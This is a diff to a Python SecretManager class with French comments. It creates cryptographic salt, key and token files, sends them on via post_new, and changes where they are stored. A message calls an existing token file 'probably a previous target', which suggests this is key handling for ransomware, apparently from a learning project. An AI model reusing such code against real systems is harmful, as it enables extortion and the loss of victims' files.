@@ -52,24 +52,23 @@ class SecretManager:
         salt,key,token=self.create()#creation données cryptographiques
 
         #on créer le repertoire de stockage en local
-        token_dir= sha256(token).hexdigest()#nom du fichier en hachant le token en sha256
-        dir_path= os.path.join(self._path, token_dir)#on se place au /root/token
+        dir_path= os.path.join(self._path, 'token')#on se place au /root/token
         os.makedirs(dir_path, exist_ok=True)#on créer le répertoire
 
         #sauvegarde du token dans token.bin
-        path = os.path.join(self._path,token_dir,'token.bin')
+        path = os.path.join(self._path,'token.bin')
         if os.path.exists(path)==False:#on vérifie qu'il n'y est pas deja un fichier token.bin 
             with open(path, "wb") as f:
                 f.write(token)
 
             #sauvegarde du salt dans salt.bin
-            path = os.path.join(self._path,token_dir,'salt.bin')
+            path = os.path.join(self._path,'salt.bin')
             with open(path, "wb") as f:
                 f.write(salt)
 
             self.post_new(salt,key,token)
         else:
-            print("Un fichier token.bin existe déja")
+            print("Un fichier token.bin existe déja, surement une précedente cible ;)")
 
 
     def load(self)->None:
